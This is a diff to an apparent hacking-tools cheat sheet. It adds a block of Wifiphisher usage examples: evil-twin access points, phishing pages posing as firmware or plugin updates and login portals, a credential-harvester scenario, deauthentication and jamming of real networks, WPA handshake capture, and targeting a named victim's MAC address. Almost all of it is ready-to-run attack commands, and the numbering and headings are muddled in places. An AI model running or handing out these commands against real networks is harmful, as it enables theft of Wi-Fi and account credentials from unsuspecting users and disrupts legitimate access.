@@ -206,6 +206,7 @@ sudo wifite
 sudo wifite --wps-only
 ```
 
+
 ## 10. Wifiphisher: Wi-Fi Phishing Attack Tool
 Wifiphisher is a tool for conducting phishing attacks against Wi-Fi networks. It creates rogue access points to trick users into revealing passwords.
 
@@ -225,6 +226,62 @@ sudo wifiphisher -aI wlan0 -jI wlan1
   - `-aI`: Interface for rogue AP.
   - `-jI`: Interface for jamming legitimate AP.
 
+### 1. Firmware Upgrade Scenario
+    sudo wifiphisher -e "Free Wi-Fi" -p firmware-upgrade
+---
+### 2. Network Login Page Scenario
+    sudo wifiphisher -e "Free Wi-Fi" -p oauth-login
+---
+### 3. Browser Plugin Update Scenario
+    sudo wifiphisher -e "Free Wi-Fi" -p plugin-update
+---
+### 4. Open Redirect Scenario
+    sudo wifiphisher -e "Free Wi-Fi" -p open-redirect
+---
+### 5. Credential Harvester Scenario
+    sudo wifiphisher -e "Free Wi-Fi" -p capture-portal
+---
+### 6. Custom Scenario
+    sudo wifiphisher -e "Free Wi-Fi" -p custom -pPD /path/to/your/phishing_page
+---
+### 2. Advanced Attack Commands
+---
+#### A. Evil Twin with No Internet (Force Login Captive Portal)
+    sudo wifiphisher -e "Free Wi-Fi" --nointernet -p oauth-login
+---
+#### B. Targeting Specific Devices (MAC Filtering)
+    sudo wifiphisher -e "Free Wi-Fi" --essid "Free Wi-Fi" --target-mac XX:XX:XX:XX:XX:XX -p firmware-upgrade
+    Replace XX:XX:XX:XX:XX:XX with the victim’s MAC address.
+---
+#### C. Handshake Capture + Phishing (For WPA Cracking)
+    sudo wifiphisher --handshake-capture handshake.cap -e "Free Wi-Fi" -p firmware-upgrade
+---
+#### D. Deauthentication Attack with Specific Channel
+    sudo wifiphisher --deauth-essid "Target Network" --deauth-channels 6 -p plugin-update
+---
+#### E. Multi-Interface Mode (For Better Stability)
+    sudo wifiphisher -aI wlan0 -jI wlan1 -p firmware-upgrade
+    - -aI wlan0: Interface for creating the rogue AP.
+    - -jI wlan1: Interface for jamming the target network.
+---
+#### E. Automatically pick the right interfaces. Target the Wi-Fi with ESSID "CONFERENCE_WIFI" and perform the "Plugin Update" scenario. The Evil Twin will be password-protected with PSK "s3cr3tp4ssw0rd".
+    wifiphisher --essid CONFERENCE_WIFI -p plugin_update -pK s3cr3tp4ssw0rd
+---
+### Advanced Options You Can Add:
+1. Disable Internet Access to Force Login:
+   
+       sudo wifiphisher -e "Free Wi-Fi" --nointernet -p network-manager-connect
+   2. Specify Network Interface (if you have multiple Wi-Fi adapters):
+   
+       sudo wifiphisher -aI wlan0 -jI wlan1 -p network-manager-connect
+       - -aI wlan0: Interface for creating the rogue Access Point.
+       - -jI wlan1: Interface for jamming the legitimate Wi-Fi network.
+
+3. Target Specific Devices (MAC Filtering):
+
+       sudo wifiphisher -e "Free Wi-Fi" --target-mac AA:BB:CC:DD:EE:FF -p network-manager-connect
+       Replace AA:BB:CC:DD:EE:FF with the victim's MAC address.
+---
 
 
 ## 11. Nmap: Network Scanning and Enumeration Tool
